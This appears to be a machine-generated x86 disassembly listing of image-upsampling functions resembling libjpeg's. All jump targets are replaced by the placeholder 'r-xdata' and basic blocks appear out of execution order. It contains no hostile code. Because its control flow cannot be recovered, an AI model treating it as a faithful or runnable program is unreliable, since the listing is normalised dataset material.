mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a0 ]
call [ edx + 0x4 ]
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x1c ]
add esp 0x14
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
cmp edx [ ecx + 0x10 ]
jb r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x8 ]
lea edx [ eax + ecx * 4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a8 ]
call [ edx + 0x4 ]
add esp 0x10
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
add ecx [ ebp - 0xc ]
mov edx [ ebp + 0x1c ]
mov [ edx ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
sub_425870
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
sub ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jbe r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x1c ]
add esp 0x14
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x60 ]
sub edx [ ecx + 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
lea eax [ edx + ecx * 4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + edx * 4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a8 ]
call [ edx + 0x4 ]
add esp 0x10
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
cmp edx [ ecx + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
sub_425980
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
push 0xa0
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1a0 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_425c60
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_425ca0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x10a ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x48 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x19
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x118 ] 0x1
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ecx + 0x8 ]
imul eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
cdq
idiv [ ecx + 0x118 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x24 ]
mov esi [ ebp + 0x8 ]
mov eax ecx
cdq
idiv [ esi + 0x118 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x110 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x114 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + eax * 4 + 0x64 ] edx
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + 0x30 ]
test ecx ecx
jne r-xdata
mov al [ ebp - 0x28 ]
mov [ ebp - 0x14 ] al
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x34 ] sub_425e30
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
shl edx 0x1
cmp edx [ ebp - 0x20 ]
jne r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x24 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xff
test edx edx
je r-xdata
mov ecx [ ebp - 0x18 ]
shl ecx 0x1
cmp ecx [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x34 ] sub_425e10
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x114 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x110 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
push edx
call sub_420c90
add esp 0x8
push eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x8 ]
add esp 0x10
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xc ] eax
mov eax [ ebp - 0x20 ]
cdq
idiv [ ebp - 0x18 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x1c ]
shl edx 0x1
cmp edx [ ebp - 0x24 ]
jne r-xdata
mov ecx [ ebp - 0x14 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x54
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x26
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp - 0x24 ]
cdq
idiv [ ebp - 0x1c ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x34 ] sub_425f70
mov edx [ ebp - 0xc ]
cmp [ edx + 0x28 ] 0x2
jbe r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x34 ] sub_425e50
mov eax [ ebp - 0x20 ]
cdq
idiv [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x8 ]
mov [ ecx + 0x8c ] al
mov eax [ ebp - 0x24 ]
cdq
idiv [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x8 ]
mov [ edx + 0x96 ] al
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x34 ] sub_426010
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x28 ] 0x2
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x34 ] sub_4260f0
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x34 ] sub_426250
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_425c60
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x114 ]
mov [ edx + 0x5c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
mov [ edx + 0x60 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425ca0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x5c ]
cmp ecx [ eax + 0x114 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x114 ]
sub eax [ edx + 0x5c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x60 ]
jbe r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ edx ]
mov [ ebp + 0x20 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x20 ]
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x60 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp + 0x18 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x5c ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0xc
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a4 ]
call [ ecx + 0x4 ]
add esp 0x14
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x60 ]
sub eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x60 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x5c ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x5c ]
cmp ecx [ eax + 0x114 ]
jl r-xdata
mov edx [ ebp + 0x20 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5c ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 4 + 0xc ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx ]
imul edx [ ecx + eax * 4 + 0x64 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ ecx + eax * 4 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ edx + ecx * 4 + 0x34 ]
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x54
mov [ ebp - 0xc ] edx
sub_425e10
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425e30
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425e50
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + edx + 0x8c ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + eax + 0x96 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x2c ] 0x0
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x28 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x5c ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x24 ] 0x1
jle r-xdata
mov eax [ ebp - 0xc ]
mov cl [ eax ]
mov [ ebp - 0x14 ] cl
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
push eax
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
push ecx
mov edx [ ebp - 0x2c ]
add edx 0x1
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call sub_420cc0
add esp 0x18
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
cmp edx [ ecx + 0x114 ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov al [ ebp - 0x14 ]
mov [ edx ] al
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
sub_425f70
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x114 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
add eax [ edx + 0x5c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov al [ edx ]
mov [ ebp - 0x10 ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x14 ]
jae r-xdata
sub_426010
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
add eax [ edx + 0x5c ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
push eax
push 0x1
mov ecx [ ebp - 0x1c ]
add ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_420cc0
add esp 0x18
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x1c ]
add eax 0x2
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov al [ edx ]
mov [ ebp - 0x10 ] al
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
cmp ecx [ eax + 0x114 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x14 ]
jae r-xdata
sub_4260f0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x114 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x10 ]
mov [ edx ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x10 ]
imul edx edx 0x3
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax ]
lea edx [ edx + ecx + 0x2 ]
sar edx 0x2
mov eax [ ebp - 0xc ]
mov [ eax ] dl
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x28 ]
sub eax 0x2
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx - 0x1 ]
lea ecx [ ecx + eax + 0x1 ]
sar ecx 0x2
mov edx [ ebp - 0xc ]
mov [ edx ] cl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov dl [ ebp - 0x10 ]
mov [ ecx ] dl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx ]
imul eax eax 0x3
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx - 0x2 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax + 0x1 ]
sar edx 0x2
mov eax [ ebp - 0xc ]
mov [ eax ] dl
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax + 0x2 ]
sar edx 0x2
mov eax [ ebp - 0xc ]
mov [ eax ] dl
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
sub_426250
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x2
jge r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
cmp ecx [ eax + 0x114 ]
jge r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x14 ]
lea edx [ ecx * 4 + 0x8 ]
sar edx 0x4
mov eax [ ebp - 0x10 ]
mov [ eax ] dl
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
imul edx edx 0x3
mov eax [ ebp - 0x1c ]
lea ecx [ edx + eax + 0x7 ]
sar ecx 0x4
mov edx [ ebp - 0x10 ]
mov [ edx ] cl
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x28 ]
sub ecx 0x2
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
imul eax eax 0x3
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx + 0x8 ]
sar edx 0x4
mov eax [ ebp - 0x10 ]
mov [ eax ] dl
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
lea eax [ edx * 4 + 0x7 ]
sar eax 0x4
mov ecx [ ebp - 0x10 ]
mov [ ecx ] al
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
